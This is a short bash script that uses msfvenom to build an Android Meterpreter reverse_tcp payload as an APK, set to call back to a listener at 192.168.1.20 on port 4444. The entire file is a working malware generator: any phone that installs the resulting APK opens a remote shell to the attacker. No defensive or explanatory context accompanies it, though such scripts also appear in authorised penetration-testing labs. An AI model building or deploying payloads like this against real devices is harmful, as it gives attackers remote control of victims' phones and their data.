#!/bin/bash

cd /data

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 --platform=android --arch=dalvik -o ${APK_FILE_NAME}

echo "apk file name: ${APK_FILE_NAME}"

